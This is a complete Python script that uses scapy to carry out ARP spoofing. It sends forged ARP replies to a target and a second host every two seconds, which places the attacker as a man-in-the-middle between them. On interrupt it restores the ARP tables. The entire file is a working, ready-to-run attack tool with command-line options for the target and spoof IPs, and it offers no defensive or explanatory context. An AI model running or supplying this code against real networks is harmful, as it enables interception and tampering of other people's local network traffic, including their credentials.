#/usr/bin/env python

from time import sleep
import scapy.all as scapy
import optparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc  

def get_options():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP")
    parser.add_option("-s", "--spoof", dest="spoof", help="Spoof IP")
    options, argumets = parser.parse_args()

    if not options.target:
        parser.error('[-] Please specify a target use --help for info')
    
    if not options.spoof:
        parser.error('[-] Please specify a spoof IP use --help for info')
    
    return options

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

options = get_options()

target_ip = options.target
spoof_ip = options.spoof

packet_count = 0    
try:
    while True:
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        packet_count += 2
        print("\r[+] Packets sent: " + str(packet_count), end='')
        sleep(2)
except KeyboardInterrupt:
    print("\n[-] Resetting ARP tables...")
    restore(target_ip, spoof_ip)
    restore(spoof_ip, target_ip)
    print("[-] Done. Bye!")  
